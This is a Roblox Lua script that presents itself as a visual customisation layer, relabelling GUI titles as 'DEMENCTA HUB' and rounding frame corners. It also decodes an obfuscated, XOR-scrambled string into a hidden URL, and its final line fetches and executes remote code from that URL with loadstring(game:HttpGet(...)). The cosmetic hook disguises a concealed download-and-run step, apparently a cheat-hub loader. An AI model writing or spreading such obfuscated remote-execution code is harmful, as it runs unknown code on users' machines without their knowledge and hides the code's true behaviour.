
--[[ STAGE 2: VISUAL CORE ]]
local DdX3uxVC_O5lsECztTE="\203\197\210\022\021\016\242\242\251\046\010\063\029\029\029\018\031\043\069\071\106\130\124\142\139\082\113\106\103\144\137\120\131\141\147\145\177\179\235\191\169\188\199\190\203\230\233\233\230\238\247\240\017\067\008\013\027\029\097\040\046\057\049\059\073\073\068\090\157\108\093\110\123\125\139\137\147\146\153\158\229\173\177\187\252\188\200\217\206\218\225\235\224\253\237\249\008\005\014\016\027\043\104\039\059\046\129\135\120\071\078\088\094\104"local avEWoSih2SpCFwRi5Dsv=122 local Lx0TWl1mMQot6=143 local FKl8gn1cZhHI=0 local pbteYxNAM6vvbk5t=6 local oxeR046vuPzzJ=27 local mBKVFQmIMdac00n4AEBY=true local oxzLf1BNNEqdOGQnGtBuD=bit32 and bit32.bxor if not oxzLf1BNNEqdOGQnGtBuD then oxzLf1BNNEqdOGQnGtBuD=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local XWDCyzt9EUIpkk8i={}for YIjZxUrl7cHL=1,#DdX3uxVC_O5lsECztTE do local GdlOSa0JYcQXLBZCnyV_Xn=string.byte(DdX3uxVC_O5lsECztTE,YIjZxUrl7cHL)local HP2dlPCumsCitG7bP9L=(Lx0TWl1mMQot6+(YIjZxUrl7cHL*pbteYxNAM6vvbk5t)+oxeR046vuPzzJ)%256 if FKl8gn1cZhHI==0 then GdlOSa0JYcQXLBZCnyV_Xn=(GdlOSa0JYcQXLBZCnyV_Xn-HP2dlPCumsCitG7bP9L)%256 XWDCyzt9EUIpkk8i[YIjZxUrl7cHL]=string.char(oxzLf1BNNEqdOGQnGtBuD(GdlOSa0JYcQXLBZCnyV_Xn,avEWoSih2SpCFwRi5Dsv))else GdlOSa0JYcQXLBZCnyV_Xn=oxzLf1BNNEqdOGQnGtBuD(GdlOSa0JYcQXLBZCnyV_Xn,avEWoSih2SpCFwRi5Dsv)XWDCyzt9EUIpkk8i[YIjZxUrl7cHL]=string.char((GdlOSa0JYcQXLBZCnyV_Xn-HP2dlPCumsCitG7bP9L)%256)end end local nIlUeibbYGgUP1iSxfOwjw=table.concat(XWDCyzt9EUIpkk8i)if mBKVFQmIMdac00n4AEBY then nIlUeibbYGgUP1iSxfOwjw=string.reverse(nIlUeibbYGgUP1iSxfOwjw)end local gj4QcP_TqgbYzjOXID_tv=nIlUeibbYGgUP1iSxfOwjw
local HubName = "DEMENCTA HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(gj4QcP_TqgbYzjOXID_tv))()
